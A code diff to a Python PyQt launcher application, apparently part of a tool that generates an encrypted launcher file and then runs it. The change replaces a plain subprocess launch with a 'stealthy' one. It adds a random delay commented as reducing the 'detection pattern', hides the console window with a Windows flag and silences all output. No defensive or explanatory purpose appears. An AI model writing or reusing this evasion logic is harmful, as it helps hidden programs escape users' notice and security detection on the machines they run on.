@@ -4,6 +4,7 @@ import random
 import string
 import logging
 import subprocess
+import time
 from cryptography.fernet import Fernet
 from PyQt5.QtWidgets import (
     QApplication, QWidget, QVBoxLayout, QLabel, QPushButton, QTextEdit, QMessageBox
@@ -216,13 +217,27 @@ class LauncherGUI(QWidget):
     def run_launcher(self):
         if os.path.exists(LAUNCHER_FILE):
             logging.info(f"Launching launcher: {LAUNCHER_FILE}")
-            # Launch launcher.py asynchronously
-            subprocess.Popen([sys.executable, LAUNCHER_FILE])
-            logging.info("Launcher started, exiting GUI.")
-            QApplication.quit()  # Close the GUI app cleanly
+
+            # Random small delay to reduce detection pattern
+            time.sleep(random.uniform(0.5, 1.5))
+
+            # Windows specific flag to hide console window
+            CREATE_NO_WINDOW = 0x08000000
+
+            try:
+                subprocess.Popen(
+                    [sys.executable, LAUNCHER_FILE],
+                    creationflags=CREATE_NO_WINDOW,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL
+                )
+                logging.info("Launcher started stealthily, exiting GUI.")
+                QApplication.quit()
+            except Exception as e:
+                logging.error(f"Failed to start launcher stealthily: {e}")
         else:
             QMessageBox.warning(self, "Error", f"{LAUNCHER_FILE} not found. Please generate it first.")
-
 
 # Entry point
 def main():
